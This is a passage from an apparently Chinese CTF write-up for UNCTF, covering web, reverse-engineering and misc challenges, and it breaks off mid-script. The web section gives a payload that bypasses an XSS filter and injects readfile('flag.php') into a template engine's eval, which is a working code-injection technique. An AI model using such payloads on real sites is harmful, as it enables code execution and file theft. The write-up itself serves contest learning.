class="string">"if("</span>.$strIf.<span class="string">") &#123; \$ifFlag=true;&#125; else&#123; \$ifFlag=false;&#125;"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $content;</span><br></pre></td></tr></table></figure><p>ç„¶åçœ‹åˆ°template.htmlï¼Œæœç´¢searchwordå’Œsearchnum</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">h4</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"glyphicon glyphicon-film sea-text"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span> <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span></span><span class="template-variable">&#123;haha:searchword&#125;</span><span class="xml"> <span class="tag">&lt;/<span class="name">a</span>&gt;</span> <span class="tag">&lt;<span class="name">small</span>&gt;</span>å…±æœ‰<span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"sea-text"</span>&gt;</span></span><span class="template-variable">&#123;haha:searchnum&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">span</span>&gt;</span>ä¸ªå½±ç‰‡ ç¬¬<span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"sea-text"</span>&gt;</span></span><span class="template-variable">&#123;searchlist:page&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">span</span>&gt;</span>é¡µ<span class="tag">&lt;/<span class="name">small</span>&gt;</span><span class="tag">&lt;/<span class="name">h4</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>æœ€åå†çœ‹çœ‹RemoveXSS</p><p>å‘ç° if:,</p><p>è§£é¢˜æ€è·¯ï¼š</p><p>é¦–å…ˆåˆ©ç”¨å››æ¬¡çš„strreplaceç»•è¿‡RemoveXss,æ§åˆ¶$templatehtml</p><p>ç„¶åæ˜¯ç»•è¿‡åˆ¤æ–­å’Œæ­£åˆ™ï¼š{if:å¼€å¤´ã€{end if}ç»“å°¾ï¼Œç„¶åçœŸæ­£æ‰§è¡Œçš„å‘½ä»¤è¦åœ¨ruleåŒ¹é…åˆ°çš„ç¬¬ä¸€ä¸ªï¼ˆ.*?ï¼‰</p><p>ç ´é¢˜ï¼š</p><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$searchnum=&#123;end <span class="keyword">if</span>&#125;</span><br><span class="line"></span><br><span class="line">$searchword=&#123;<span class="keyword">if</span>&#123;haha:<span class="keyword">type</span>&#125;</span><br><span class="line"></span><br><span class="line">$<span class="keyword">type</span>=:read&#123;haha:typename&#125;</span><br><span class="line"></span><br><span class="line">$typename=file(%27flag.php%27)&#125;</span><br></pre></td></tr></table></figure><p>è¿™æ ·contentè¢«æ›¿æ¢ä¸º</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">h4</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"glyphicon glyphicon-film sea-text"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span> <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span></span><span class="template-variable">&#123;<span class="keyword">if</span>:readfile(%27flag.php%27)&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">a</span>&gt;</span> <span class="tag">&lt;<span class="name">small</span>&gt;</span>å…±æœ‰<span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"sea-text"</span>&gt;</span></span><span class="template-variable">&#123;end <span class="keyword">if</span>&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">span</span>&gt;</span>ä¸ªå½±ç‰‡ ç¬¬<span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"sea-text"</span>&gt;</span></span><span class="template-variable">&#123;searchlist:page&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">span</span>&gt;</span>é¡µ<span class="tag">&lt;/<span class="name">small</span>&gt;</span><span class="tag">&lt;/<span class="name">h4</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>æ­£åˆ™è¿‡å$iarä¸º</p><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [<span class="meta">0</span>] =&gt; Array</span><br><span class="line">        (</span><br><span class="line">            [<span class="meta">0</span>] =&gt; &#123;<span class="keyword">if</span>:readfile(%<span class="number">27f</span>lag.php%<span class="number">27</span>)&#125;&lt;/a&gt; &lt;small&gt;å…±æœ‰&lt;span <span class="keyword">class</span>=<span class="string">"sea-text"</span>&gt;&#123;end <span class="keyword">if</span>&#125;</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    [<span class="meta">1</span>] =&gt; Array</span><br><span class="line">        (</span><br><span class="line">            [<span class="meta">0</span>] =&gt; readfile(%<span class="number">27f</span>lag.php%<span class="number">27</span>)</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    [<span class="meta">2</span>] =&gt; Array</span><br><span class="line">        (</span><br><span class="line">            [<span class="meta">0</span>] =&gt; &lt;/a&gt; &lt;small&gt;å…±æœ‰&lt;span <span class="keyword">class</span>=<span class="string">"sea-text"</span>&gt;</span><br><span class="line">        )</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>ç„¶å$strIfè¢«èµ‹å€¼ä¸ºreadfile(%27flag.php%27)</p><p>ç„¶å @eval(â€œif(readfile(%27flag.php%27)) { $ifFlag=true;} else{ $ifFlag=false;}â€);</p><p>readlfileè¾“å‡ºflag</p><p>æœ€ç»ˆpayloadï¼š</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchnum=&#123;end <span class="keyword">if</span>&#125;&amp;content=<span class="symbol">&lt;search&gt;</span>&#123;<span class="keyword">if</span>&#123;hah<span class="variable">a:type</span>&#125;&lt;/<span class="built_in">search</span>&gt;&amp;<span class="built_in">type</span>=:<span class="keyword">read</span>&#123;hah<span class="variable">a:typename</span>&#125;&amp;typename=<span class="keyword">file</span>(%<span class="number">27</span>flag.php%<span class="number">27</span>)&#125;</span><br></pre></td></tr></table></figure><p><a href="https://p2.ssl.qhimg.com/t01a43546f5bc598ac5.png" target="_blank" rel="noopener"><img src="https://p2.ssl.qhimg.com/t01a43546f5bc598ac5.png" alt="img"></a></p><p>flagï¼šUNCTF{5ee25610af306b625b4cadb4cb5fa24b}</p><h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="666"><a href="#666" class="headerlink" title="666"></a>666</h3><p>é€†å‘ç­¾åˆ°é¢˜ï¼Œ</p><p>ä¸»è¦å‡½æ•°</p><p><a href="https://p0.ssl.qhimg.com/t01acfae537b2029f57.png" target="_blank" rel="noopener"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="img"></a></p><p>ç„¶åæ‰¾åˆ°ä¸€äº›å…³é”®å€¼ï¼Œå†æ ¹æ®åŠ å¯†é€»è¾‘å†™è§£å¯†è„šæœ¬å³å¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">expï¼š</span><br><span class="line"></span><br><span class="line">cipher=<span class="string">'''izwhroz""w"v.K".Ni'''</span></span><br><span class="line">key=<span class="number">0x12</span></span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(cipher),<span class="number">3</span>):</span><br><span class="line">    flag+=chr((ord(cipher[i])^key)<span class="number">-6</span>)</span><br><span class="line">    flag+=chr((ord(cipher[i+<span class="number">1</span>])^key)+<span class="number">6</span>)</span><br><span class="line">    flag+=chr((ord(cipher[i+<span class="number">2</span>])^key)^<span class="number">6</span>)</span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure><p>å¾—åˆ°flagï¼šunctf{b666b666b}</p><h3 id="ç¥å¥‡çš„æ•°ç»„"><a href="#ç¥å¥‡çš„æ•°ç»„" class="headerlink" title="ç¥å¥‡çš„æ•°ç»„"></a>ç¥å¥‡çš„æ•°ç»„</h3><p><a href="https://p5.ssl.qhimg.com/t01b1b5242af8d6740b.png" target="_blank" rel="noopener"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="img"></a></p><p>æ‰“å¼€ä¸»å‡½æ•°ï¼Œè¯»ä¸€ä¸‹ç¨‹åºé€»è¾‘ï¼Œç»“åˆå¤§å°ç«¯å­˜å‚¨é¡ºåºã€‚å¥½çš„ï¼Œflagå°±æ˜¯checkboxé‡Œç…§æŠ„ã€‚</p><p><a href="https://p2.ssl.qhimg.com/t01ea30e449f32cf1a9.png" target="_blank" rel="noopener"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="img"></a></p><p>flagï¼šad461e203c7975b35e527960cbfeb06c</p><h3 id="BabyXor"><a href="#BabyXor" class="headerlink" title="BabyXor"></a>BabyXor</h3><p>æ‰‹åŠ¨è„±å£³+åŠ¨è°ƒï¼Œç›´æ¥å‡ºflag23333</p><p><a href="https://p1.ssl.qhimg.com/t01243cb805fa8ffd23.png" target="_blank" rel="noopener"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="img"></a></p><p><a href="https://p2.ssl.qhimg.com/t01e0f7ec207dfc09cb.png" target="_blank" rel="noopener"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="img"></a></p><p><a href="https://p1.ssl.qhimg.com/t01f7bcda3fa207272c.png" target="_blank" rel="noopener"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="img"></a></p><p>flagï¼šflag{2378b077-7d6e-4564-bdca-7eec8eede9a2}</p><h3 id="unctfeasyMaze"><a href="#unctfeasyMaze" class="headerlink" title="unctfeasyMaze"></a>unctfeasyMaze</h3><p>è§£æ³•ä¸€ï¼šidaåæ±‡ç¼–åç¨‹åºé€»è¾‘å°±æ˜¯å¯¹åœ°å›¾è¿›è¡Œäº†ä¸¤æ¬¡åˆå§‹åŒ–ï¼Œç„¶åå°±æ˜¯æ­£å¸¸èµ°è¿·å®«äº†</p><p>å°†æ–­ç‚¹è®¾ç½®åœ¨åœ°å›¾ç¬¬äºŒæ¬¡åˆå§‹åŒ–å®Œæˆåï¼Œç„¶åæŸ¥çœ‹RSIçš„å€¼</p><p><a href="https://p1.ssl.qhimg.com/t01737c26b1931378a3.png" target="_blank" rel="noopener"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="img"></a></p><p>7ä¸ªä¸€è¡Œæ’åˆ—</p><p><a href="https://p2.ssl.qhimg.com/t01e30cd9bab6cc1578.png" target="_blank" rel="noopener"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="img"></a></p><p>èµ°å®Œå³å¯å¾—åˆ°flag</p><p><a href="https://p4.ssl.qhimg.com/t01e559eb7eb446c594.png" target="_blank" rel="noopener"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="img"></a></p><p>flagï¼šUNCTF{ssddwdwdddssaasasaaassddddwdds}</p><p>è§£æ³•äºŒï¼šçˆ†ç ´</p><p>è¿è¡Œäº†ç¨‹åºåå‘ç°å¯ä»¥ä¸€æ­¥ä¸€æ­¥èµ°ï¼Œä¸€æ—¦èµ°é”™å°±ä¼šæŠ¥é”™</p><p>äºæ˜¯å¯ä»¥æŒ‰ä½çˆ†ç ´ï¼Œæœ€å¤šä¹Ÿå°±æ˜¯è¯•4*29æ¬¡ï¼Œå¾ˆå¿«çš„ã€‚ã€‚ã€‚ï¼ˆè‡³å°‘æ¯”miscé‚£ä¸ªèµ°è¿·å®«è¦å¿«ï¼‰</p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="ä¿¡å·ä¸å¥½æˆ‘å…ˆèµ°äº†"><a href="#ä¿¡å·ä¸å¥½æˆ‘å…ˆèµ°äº†" class="headerlink" title="ä¿¡å·ä¸å¥½æˆ‘å…ˆèµ°äº†"></a>ä¿¡å·ä¸å¥½æˆ‘å…ˆèµ°äº†</h3><p>ä¸‹è½½å¾—åˆ°å›¾ç‰‡ï¼Œçœ‹äº†åå…­è¿›åˆ¶æ²¡æœ‰éšè—ä¸œè¥¿ï¼Œäºæ˜¯ç”¨ç¥å™¨Stegsolveè¯•ä¸€æ³¢LSB</p><p><a href="https://p3.ssl.qhimg.com/t018175cd593a8bf85d.png" target="_blank" rel="noopener"><img src="https://p3.ssl.qhimg.com/t018175cd593a8bf85d.png" alt="img"></a></p><p>æœç„¶æœ‰ä¸œè¥¿ï¼Œè—äº†ä¸€ä¸ªzipåŒ…ã€‚</p><p>ä¿å­˜ä¸‹æ¥è§£å‹ç¼©å¾—åˆ°ä¸€ä¸ªå¼ è·Ÿä¹‹å‰ä¸€æ ·çš„å›¾ç‰‡ã€‚</p><p>ç›²çŒœç›²æ°´å°ï¼Œå·¥å…·ä¸€æŠŠæ¢­ï¼Œå¾—åˆ°</p><p><a href="https://p1.ssl.qhimg.com/t012729ab73729c051f.png" target="_blank" rel="noopener"><img src="https://p1.ssl.qhimg.com/t012729ab73729c051f.png" alt="img"></a></p><p>flagï¼šunctf{9d0649505b702643}</p><h3 id="äº²çˆ±çš„"><a href="#äº²çˆ±çš„" class="headerlink" title="äº²çˆ±çš„"></a>äº²çˆ±çš„</h3><p>åŸä»¥ä¸ºæ˜¯mp3éšå†™ï¼Œç„¶è€Œæ²¡æœ‰å¯†ç ã€‚</p><p>çœ‹åå…­è¿›åˆ¶æ•°æ®å‘ç°æœ‰ä¸€ä¸ªzipåŒ…åœ¨åº•ä¸‹ï¼Œ</p><p>ç„¶åæ³¨é‡Šæœ‰æç¤º</p><p>æ ¹æ®æç¤ºï¼Œå’Œæ­Œåï¼Œåœ¨qqéŸ³ä¹ æµ·é˜”å¤©ç©º æç° çš„è¯„è®ºåŒºï¼Œåœ¨å¯¹åº”è¯„è®ºæ—¶é—´æ‰¾åˆ°å¯†ç ï¼šçœŸçš„ä¸Šå¤´</p><p>è§£å‹å¾—åˆ°ä¸€å¼ å›¾ç‰‡ï¼Œçœ‹åå…­è¿›åˆ¶æ•°æ®ï¼Œåº•ä¸‹éšå†™äº†ä¸€ä¸ªwordæ–‡æ¡£ï¼Œ</p><p>wordæ‰“å¼€ï¼Œå‘ç°å³ä¸‹è§’æœ‰ç«¯å€ªï¼Œæ˜¯å›¾ç‰‡ä¸€è§’ï¼Œæ‹–å‡ºæ¥å¾—åˆ°flag</p><p>ï¼ˆæˆ–è€…ç›´æ¥æŠŠwordæ–‡æ¡£å½“zipæ‰“å¼€ï¼Œåœ¨wordæ–‡ä»¶å¤¹ä¸­çš„mediaæ–‡ä»¶å¤¹ä¸­ä¹Ÿæœ‰flag çš„å›¾ç‰‡ï¼‰</p><p><a href="https://p1.ssl.qhimg.com/t01b72be95beef42f94.png" target="_blank" rel="noopener"><img src="https://p1.ssl.qhimg.com/t01b72be95beef42f94.png" alt="img"></a></p><p>flagï¼šUNCTF{W3L0v3Unctf}</p><h3 id="å¿«ä¹æ¸¸æˆé¢˜"><a href="#å¿«ä¹æ¸¸æˆé¢˜" class="headerlink" title="å¿«ä¹æ¸¸æˆé¢˜"></a>å¿«ä¹æ¸¸æˆé¢˜</h3><p>ç»ˆäºå‡ºç°äº†ç­¾åˆ°é¢˜ï¼Œç©æ¸¸æˆå¾—flag</p><p><a href="https://p2.ssl.qhimg.com/t0169f0bdcad13d39a6.png" target="_blank" rel="noopener"><img src="https://p2.ssl.qhimg.com/t0169f0bdcad13d39a6.png" alt="img"></a></p><p>flagï¼šUNCTF{c783910550de39816d1de0f103b0ae32}</p><h3 id="Happy-Puzzle"><a href="#Happy-Puzzle" class="headerlink" title="Happy Puzzle"></a>Happy Puzzle</h3><p>æ‰‹æ’•PNGå‘—ï¼Œæç¤ºé‡Œçš„RGBæ²¡ç®¡ï¼Œ400*400æ¯”è¾ƒæœ‰ç”¨ï¼Œ</p><p>æœ€åŸºæœ¬çš„PNGç»„æˆï¼šæ–‡ä»¶å¤´ï¼ŒIHDRï¼ŒIDATï¼ˆlen(data)+â€™IDATâ€™+data+crcï¼‰ï¼ŒIENDï¼Œå’Œéšå¤„å¯è§çš„crc32æ ¡éªŒï¼ˆè¿™ç©æ„å„¿å‘æƒ¨æˆ‘äº†ï¼‰</p><p>ç”¨windowsæ¯”è¾ƒæ–¹ä¾¿çš„æ˜¯ï¼Œcrcä¸ç”¨ç®—ï¼Œç”¨0å ä½å³å¯ï¼ŒIENDä¹Ÿå¯ä»¥ä¸ç”¨åŠ </p><p>è§£é¢˜è¿‡ç¨‹ï¼š</p><ol><li>éšä¾¿æ‰¾ä¸ªPNGï¼Œæ‹¿åˆ°pngæ–‡ä»¶å¤´+IHDRçš„æ•°æ®</li><li>æ”¹å®½é«˜</li><li>ç»™æ‰€æœ‰dataæ–‡ä»¶ï¼Œå‰é¢æ¥ä¸Šlen(data)ï¼Œå³00002800ï¼ŒIDATï¼Œå†ç»™æœ«å°¾åŠ ä¸Š00000000å crc32çš„ä½</li><li>åšå‡º26å¼ å›¾ï¼Œçœ‹å“ªå¼ å›¾æœ‰å›¾åƒï¼Œç„¶åä»¥æ­¤ç±»æ¨çš„å†å¾€ååŠ data</li></ol><ul><li>ç»“æœï¼š</li></ul><p><a href="https://p1.ssl.qhimg.com/t01ebe3f81bfa8ebd96.png" target="_blank" rel="noopener"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="img"></a></p><p>è´´ä¸ŠåŠè‡ªåŠ¨expï¼š</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import <span class="built_in">os</span></span><br><span class="line">head=<span class="string">'89504e470d0a1a0a0000000d494844520000019000000190080200000000000000'</span></span><br><span class="line">idata=<span class="string">'0000280049444154'</span></span><br><span class="line">crc=<span class="string">"1bad748e"</span></span><br><span class="line">with <span class="built_in">open</span>(filename,<span class="string">"rb"</span>) as f:</span><br><span class="line">       data = f.<span class="built_in">read</span>().encode(<span class="string">"hex"</span>)</span><br><span class="line">rootdir = <span class="string">''</span></span><br><span class="line">list = <span class="built_in">os</span>.listdir(rootdir) </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="built_in">len</span>(list)):</span><br><span class="line">       <span class="built_in">path</span> = <span class="built_in">os</span>.<span class="built_in">path</span>.join(rootdir,list[i])</span><br><span class="line">       <span class="keyword">if</span> <span class="built_in">os</span>.<span class="built_in">path</span>.isfile(<span class="built_in">path</span>) <span class="keyword">and</span> <span class="built_in">path</span>[<span class="number">-5</span>:]==<span class="string">'.data'</span>:</span><br><span class="line">              with <span class="built_in">open</span>(<span class="built_in">path</span>,<span class="string">"rb"</span>) as f:</span><br><span class="line">                     txt = f.<span class="built_in">read</span>()</span><br><span class="line">                     txt=data+idata+txt.encode(<span class="string">"hex"</span>)+crc</span><br><span class="line">              with <span class="built_in">open</span>(<span class="built_in">path</span>.replace(<span class="string">"puzzle"</span>,<span class="string">"puzzle2"</span>).replace(<span class="string">"data"</span>,<span class="string">"png"</span>),<span class="string">"wb"</span>) as f:</span><br><span class="line">                     f.<span class="built_in">write</span>(txt.decode(<span class="string">'hex'</span>))</span><br></pre></td></tr></table></figure><p>flagï¼šucntf{312bbd92c1b291e1827ba519326b6688}</p><h3 id="think"><a href="#think" class="headerlink" title="think"></a>think</h3><p>ç”¨pythonçš„åŒ¿åå‡½æ•°ä¸€å¥è¯åˆ¶ä½œå‡ºçš„é¢˜ç›®</p><p><a href="https://p4.ssl.qhimg.com/t01005759a8be9dcc16.png" target="_blank" rel="noopener"><img src="https://p4.ssl.qhimg.com/t01005759a8be9dcc16.png" alt="img"></a></p><p>å…³é”®åœ¨è¿™é‡Œï¼Œcheckå‡½æ•°åˆ¤æ–­checknumï¼Œå¦‚æœchecknumä¸º1ï¼Œå°±æ‰“å°(<strong>print(â€˜Congratulation!â€™), (</strong>print(decrypt(key, encrypted)),çŒœæµ‹åé¢åŠéƒ¨åˆ†å°±æ˜¯flag</p><p>äºæ˜¯ï¼Œç›´æ¥è¿è¡Œä»£ç ï¼Œç„¶ååœ¨IDLEé‡Œé”®å…¥check(1)ï¼Œå¾—åˆ°flag</p><p><a href="https://p5.ssl.qhimg.com/t0115f99ae8df9d03eb.png" target="_blank" rel="noopener"><img src="https://p5.ssl.qhimg.com/t0115f99ae8df9d03eb.png" alt="img"></a></p><p>flag:flag{34a94868a8ad9ff82baadb326c513d40}</p><h3 id="Hidden-secret"><a href="#Hidden-secret" class="headerlink" title="Hidden secret"></a>Hidden secret</h3><p>ä¸‹è½½æ‹¿åˆ°ä¸‰ä¸ªé‡Œé¢å…¨æ˜¯åå…­è¿›åˆ¶çš„æ–‡ä»¶</p><p>çœ‹åˆ°03 04 05 06 01 02</p><p>å°±æ„è¯†åˆ°è¿™ä¸‰ä¸ªæ˜¯è¢«å»æ‰äº†50 4Bçš„zipåŒ…çš„ä¸‰æ®µæ•°æ®</p><p>ç”¨010editoræ‹¼æ¥èµ·æ¥åå¾—åˆ°ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œé‡Œé¢æ˜¯ä¸€ä¸ªå›¾ç‰‡</p><p>ç”¨010editoræ‰“å¼€å›¾ç‰‡ååº•ä¸‹è—äº†ä¸€ä¸ªzipåŒ…</p><p>è§£å‹å¾—åˆ°ä¸€ä¸²å¯†æ–‡ï¼šâ€K&lt;jslc7b5â€™gBA&amp;]_5MF!h5+E.@IQ&amp;A%EExEzp\X#9YhiSHV#â€</p><p>baseå…¨å®¶æ¡¶èµ°ä¸€éï¼Œæœ€åç¡®å®šæ˜¯base92</p><p><a href="https://p2.ssl.qhimg.com/t0183d046de0ef60b68.png" target="_blank" rel="noopener"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="img"></a></p><p>å¾—åˆ°flagï¼šunctf{cca1a567c3145b1801a4f3273342c622}</p><h3 id="EasyBox"><a href="#EasyBox" class="headerlink" title="EasyBox"></a>EasyBox</h3><p>ncè¿ä¸Šåæ˜¯ä¸ªæ•°ç‹¬é¢˜ï¼Œä¸è¿‡æ˜¯éå¸¸è§„çš„ï¼Œåªéœ€è¦è¡Œå’Œåˆ—ä¸é‡å¤å³å¯</p><p>é­”æ”¹äº†ä¸ªå¤§ä½¬çš„è„šæœ¬ï¼š<a href="https://blog.csdn.net/zonnin/article/details/78813698" target="_blank" rel="noopener">https://blog.csdn.net/zonnin/article/details/78813698</a></p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line">import itertools</span><br><span class="line">from pwn import *</span><br><span class="line"><span class="built_in">context</span>.log_level='debug'</span><br><span class="line">sh = remote('<span class="number">101.71</span>.29.5',<span class="number">10011</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">content</span> = sh.recvuntil(<span class="string">"answer :\n"</span>)[<span class="number">339</span>:<span class="number">718</span>].replace(<span class="string">"\n"</span>,<span class="string">""</span>).<span class="built_in">split</span>(<span class="string">"+-+-+-+-+-+-+-+-+-+"</span>)</span><br><span class="line">sudoku=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">content</span>:</span><br><span class="line">    <span class="keyword">if</span> i!=<span class="string">""</span>:</span><br><span class="line">        sudoku.<span class="built_in">append</span>(i.replace(<span class="string">" "</span>,<span class="string">"0"</span>)[<span class="number">1</span>:-<span class="number">1</span>].<span class="built_in">split</span>(<span 